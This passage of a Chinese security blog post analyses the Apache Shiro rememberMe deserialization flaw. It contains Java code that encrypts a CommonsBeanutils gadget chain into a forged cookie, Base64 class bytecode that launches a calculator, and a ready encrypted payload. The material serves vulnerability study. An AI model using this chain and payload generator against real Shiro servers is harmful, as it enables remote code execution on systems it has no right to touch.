PKCS5Padding 填充方式</span><br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">"AES/CBC/PKCS5Padding"</span>);<br>        <span class="hljs-comment">// 初始化 Cipher 为加密模式，并传入密钥和 IV</span><br>        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec);<br>        <span class="hljs-type">byte</span>[] encryptedData = cipher.doFinal(data);<br>        <span class="hljs-comment">// 创建一个包含 IV 和加密数据的新数组</span><br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + encryptedData.length];<br>        <span class="hljs-comment">// 复制 IV 到输出数组的前 16 个字节</span><br>        System.arraycopy(iv, <span class="hljs-number">0</span>, output, <span class="hljs-number">0</span>, iv.length);<br>        <span class="hljs-comment">// 复制加密数据到输出数组的后续部分</span><br>        System.arraycopy(encryptedData, <span class="hljs-number">0</span>, output, iv.length, encryptedData.length);<br>        <span class="hljs-comment">// 返回包含 IV 和加密数据的字节数组</span><br>        <span class="hljs-keyword">return</span> output;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFileToByteArray(String filePath) <span class="hljs-keyword">throws</span> IOException {<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath);<br>        <span class="hljs-type">byte</span>[] byteArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) file.length()]; <span class="hljs-comment">// 根据文件大小初始化字节数组</span><br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)) {<br>            <span class="hljs-type">int</span> <span class="hljs-variable">bytesRead</span> <span class="hljs-operator">=</span> fis.read(byteArray); <span class="hljs-comment">// 读取文件内容到字节数组</span><br>            <span class="hljs-keyword">if</span> (bytesRead != byteArray.length) {<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"Could not completely read the file: "</span> + filePath);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> byteArray;<br>    }<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getPOC</span><span class="hljs-params">(String fileName)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">byte</span>[] bytes = encrypt(readFileToByteArray(fileName));<br>        System.out.println(Base64.getEncoder().encodeToString(bytes) + <span class="hljs-string">"\nPocLength:"</span> + bytes.length);<br>    }<br>}<br></code></pre></td></tr></table></figure>
+
+<p>然后将上次写好的CB链放进去加密一下，</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009160457347.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>重发请求包：注意这里要删除之前获得的<code>JSESSIONID</code>，否则不会重新验证<code>rememberMe</code></p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009160521557.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>然后，没弹出计算器，去看看Shiro报错，没有出现解密相关的报错说明加密写的没有问题</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009192724018.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>为什么会出现CC的依赖呢，去看一下<code>BeanComparator</code>的内容，确实依赖的CC库，在没有指定比较器时默认配置了<code>ComparableComparator</code></p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009193230826.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>显然这里没有CC的依赖，如何解决，是否能有一个类可以替代<code>ComparableComparator</code></p>
+<p>分析一下需要满足的条件：</p>
+<ul>
+<li>不依赖CC库，就是jdk/shiro/CB中带有的</li>
+<li>需要<code>implements Comparator,Serializable</code></li>
+<li>兼容性强，意思就是长时间没有迭代更新的</li>
+</ul>
+<p>怎么去找呢，在IDEA中ctrl+h可以看哪些类实现了接口，如图：</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009194645589.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>这里可以有很多选择，phith0n原文中用的是<code>CaseInsensitiveComparator</code>，它是String类中的一个子类，满足上面的所有条件。</p>
+<p>这里我用的是<code>java.util.Collections$ReverseComparator2</code>，也能满足条件，怎么获取它的实例，看对应的类怎么写的就行，这里用<code>Collections.reverseOrder()</code>即可获取一个对应的实例。</p>
+<p>下面构造测试代码：在CB-1的基础上稍微改一下就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">byte</span>[] CalcCode = Base64.getDecoder().decode(<br>            <span class="hljs-string">"yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA"</span> +<br>                    <span class="hljs-string">"CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP"</span> +<br>                    <span class="hljs-string">"TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a"</span> +<br>                    <span class="hljs-string">"W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx"</span> +<br>                    <span class="hljs-string">"jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc"</span> +<br>                    <span class="hljs-string">"GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9"</span> +<br>                    <span class="hljs-string">"4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA"</span> +<br>                    <span class="hljs-string">"ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM"</span> +<br>                    <span class="hljs-string">"MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb"</span> +<br>                    <span class="hljs-string">"HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR"</span> +<br>                    <span class="hljs-string">"lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL"</span> +<br>                    <span class="hljs-string">"2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA"</span> +<br>                    <span class="hljs-string">"nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA"</span> +<br>                    <span class="hljs-string">"AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA"</span> +<br>                    <span class="hljs-string">"ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA"</span> +<br>                    <span class="hljs-string">"bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg=="</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">calcTemp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(calcTemp, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]{CalcCode});<br>    setFieldValue(calcTemp, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"CalcTemplatesImpl"</span>);<br>    setFieldValue(calcTemp, <span class="hljs-string">"_tfactory"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">2</span>, comparator);<br>    queue.add(<span class="hljs-string">"3xsh0re"</span>);<br>    queue.add(<span class="hljs-string">"CB-1"</span>);<br><br>    setFieldValue(comparator, <span class="hljs-string">"property"</span>, <span class="hljs-string">"outputProperties"</span>);<br>    setFieldValue(comparator, <span class="hljs-string">"comparator"</span>, Collections.reverseOrder());<span class="hljs-comment">// here!</span><br>    setFieldValue(queue, <span class="hljs-string">"queue"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{calcTemp, calcTemp});<br>}<br></code></pre></td></tr></table></figure>
+
+<p>用加密函数生成一个payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">KsLiat7W1iFZZ4siCmYTxl22F68mOMu4PWJ2+ARjbnwvhuXfnlF4q9Zo8kgwslicdxGlttpLYv<span class="hljs-regexp">/cEgFLk/</span>DatTJ+nITGQWf2+XYMjJVy38Li8l4DCwq9SzpPLVZX3bhM8P8dJuctGoB66hXXDN3kDvVntLbrhSuEyFDst5ZLSV5gN+TSOEvjVgJEOnnIy51S+PKDBy61hoRY6QkfPM0I3c123HBxTcNlh8ljQLl6AtQiKDStH9EgiD+ftPvnpPOydq1Yl<span class="hljs-regexp">//</span>+OgOyNcCXSiEH1BZwkpC8J97fcilwzErw3lU2JClg14ygt2Wr1oeGJf50scRixDc8ETfGLMXRdGiE9VBUC2lN57kjiMQTzLO5cSski9TI84V6LAoXAht1+EfK69UpmUTEBm31JMqn+<span class="hljs-number">38</span>qracdrGt6TKpkVdnRzgcbSuFynNcheeFUXoN5OVwtEAaPaGCUX6hzoHdIVyc2LyrOQFacJ<span class="hljs-regexp">/wcpBzF7dH4NarbSPcv3G6AlRG5ObM3DRNhQx5+UHBryXGwca8xJtNxHFotgVSSymYjLu2eDmeG8sEGregonyqSFdog0Vy7z/</span>EW4bwX+YDkETmfgBzbVPIS3CO8pEVJSeT<span class="hljs-regexp">/Kod0uLGKEwD49sE0W9WEQQZcejWFjuz39NdklD6loblR+HPFPdo++E7L39n8qELxhvE6ndIuA/</span>ReaShf4iipKhCT5KTwR<span class="hljs-regexp">/0u+F1FDWkoLFeMCgvHcYAYr815/g</span>v7dG5i4<span class="hljs-regexp">/8z8uEFgFCmBkF/g</span>oxmPcW9IH6apdfd1SWjP<span class="hljs-regexp">/zt82axSoXFJWLL8jqKdFLCuSCHgzoV04xIqIfcRDnvA9h/u</span>zmjziWkcT8Qt3NVm7aB1<span class="hljs-regexp">/+VP+tiq9ToYRvvlmeUNbfIOBsU9f3Ux9pRJ7jKh6xJfpDo3ch6diMUUHR+26APQJxiPYCmhII4laE0x39DsNGty/</span>Rhn5W5A55njRdfKZDvkPgqSQf42P+L8X0TrVWZwDSkXsJt1YzYK+hmykAd++hHFthUdaEJASvz9WCtHPvKhtm4cUdnMI<span class="hljs-regexp">/C+BhvGhP9o0C/</span>I<span class="hljs-regexp">/J7kfzrUbdeIRs8NnuD4wxDyTS367BPDgNPbZEPGHejR9RmV+LRK+ehT9132G5M5Qrwltt0fc9EfvlEZpL1PSlmBObboPxdln0hpYS7WMBkkRLoz0pNnbNqyUvJ8Sl1CutDOKQ2LER+4RMbtBCV/</span>GKu<span class="hljs-regexp">/kBsJkosweRvXKaiWSDLgrVRrlcB2M3TANGoVc5Rlv4ofl6I6EIisBV1HsmRreHXYY1eo092rMIwD/</span><span class="hljs-regexp">/skNoyoE4b3OKp7rYYSNaByeu1vokiPinOTQ+qpINvqOLh2S/</span><span class="hljs-number">19</span>K5fnyAbVZZQ31LeVIu<span class="hljs-regexp">/3kACMo4au1n35C0D1foxP+iZzr48HeFxswu/</span>pT9PROfqg1DFjDocB8N9JGS37TBeikP5eRySdxTQtlg96YW+Mjv852IwTK74o<span class="hljs-regexp">/hzEr1N02snFa6pB3ORaKBFK1GL/</span><span class="hljs-number">2</span>N6kGL16wrQVcjHobS7gmckWp4wCVfS8vwo9nqOsCqLc5GaqyCNJ1y0kl8EhQ0LZ<span class="hljs-regexp">/GLzHrpxeZUpqrpKEf18KW21XAXi5BGowliAttMz4g5PlOGJEVZaj4LEKImjDsoTOi3xxbNKfYos/g</span>qVCMRlpqb1ijo4XP7CapOXDdX5d82ve3EtoS4oou3WdmhFiC0aRB7OnLhe<span class="hljs-regexp">/AWi0jLYIa+7EhU4tnoGU/</span>UtFgFXr3rUZdGjTiFo1yAmhEVFOc3U5lYVGcQ3wLnT+K3JCsAL7p4xX<span class="hljs-regexp">/EBfHbYGYDdDVDpMY7dM8jUCTUJ3eoWjwqpvMJMBg31KYUB+/</span><span class="hljs-number">5</span>fbr96IotBHK3PLvJoWh<span class="hljs-regexp">/7tRzd+1wQdYQ8j+SGIAVZ59hNsHjwnNZQaJXEPTALwc7V+V1NHSWe+KzJLGZmoPQg0Fu8THOB+gh0DYImLg/</span>C5+ilGNJKqsBmapfn1XErlCVzasJkrx+ldAMHdnxh3Lasn1Y1urMOBVuh5cOYoHnJQMjQNTVFPs<span class="hljs-regexp">/1hwBJ/</span>Z4T4mUweO57RuqMmxb+<span class="hljs-number">2</span>gytNwR87H<span class="hljs-regexp">/V748dqjrz4obHNoi/</span>CyUw5aAlaE=<br></code></pre></td></tr></table></figure>
+
+<p>攻击：</p>
+<img src="/2024/08/24/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241009200315744.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>当然这里还有一些报错，不过这是武器化该解决的问题，这里暂且不提。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3xsh0re/CC_ChainDemo">CB-Shiro完整Demo</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shiro反序列化漏洞分析</div>
+      <div>https://3xsh0re.github.io/2024/08/24/Shiro反序列化漏洞分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>3xsh0re</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">URLDNS链分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/21/CB%E9%93%BE%E5%88%86%E6%9E%90/" title="CB链分析">
+                        <span class="hidden-mobile">CB链分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"3xsh0re/Blog_Comment","repo-id":"R_kgDOMZnVkQ","category":"Announcements","category-id":"DIC_kwDOMZnVkc4ChFCz","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"bottom","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>博客由Hexo驱动~</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
